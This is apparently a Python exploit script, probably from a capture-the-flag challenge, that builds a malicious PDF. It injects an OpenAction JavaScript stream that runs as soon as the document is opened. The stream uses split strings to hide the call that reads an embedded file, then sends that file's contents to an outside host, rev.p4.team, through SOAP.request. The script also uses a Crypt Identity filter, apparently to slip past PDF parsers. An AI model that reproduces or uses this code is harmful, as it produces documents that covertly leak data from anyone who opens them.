with open('original.pdf', 'rb') as f:
    data = bytearray(f.read())

CODE = '''

var data = util.stringFromStream(this["getDat" + "aObje" + "ctContents"]("x",true));
SOAP.request('http://rev.p4.team:1234/test' + data, []);

'''

# STEP 1, update catalog

data = data.replace(b'/Type /Catalog', b'/Type /Catalog /OpenAction << /JS 10 0 R /S /JavaScript >> /Names << /EmbeddedFiles << /Names [(x) << /EF << /F 5 0 R >> >> ] >> >>')

# STEP 2, add code obj

code = CODE.strip()
code_stream_length = len(code)

code_obj = f'''
10 0 obj
    << /Filter [/Crypt] /DecodeParms [<< /Name /Identity >>]
       /Length {code_stream_length}
    >>
stream
{code}
endstream
endobj
'''.strip()

data = data.replace(b'\nxref\n', f'\n{code_obj}\nxref\n'.encode())

# STEP 3, update xref

data = data.replace(b'\nxref\n0 10', b'\nxref\n0 11')

def new_offset(obj):
    return str(data.find(f"{obj} 0 obj\n".encode())).rjust(10, '0').encode()

data = data.replace(b'0000000059', new_offset(1))
data = data.replace(b'0000000087', new_offset(2))
data = data.replace(b'0000000362', new_offset(3))
data = data.replace(b'0000000458', new_offset(4))
data = data.replace(b'0000000517', new_offset(5))
data = data.replace(b'0000000861', new_offset(6))
data = data.replace(b'0000000898', new_offset(7))
data = data.replace(b'0000001004', new_offset(8))
data = data.replace(b'0000001101', new_offset(9))

code_obj_offset = str(data.find(b'10 0 obj')).rjust(10, '0') 

data = data.replace(b'\ntrailer', f'\n{code_obj_offset} 00000 n\ntrailer'.encode())

# STEP 4, update startxref
xref_position = data.find(b'\nxref\n') + 1
data = data.replace(b'\n1651\n', f'\n{xref_position}\n'.encode())


with open('final.pdf', 'wb') as f:
    f.write(data)

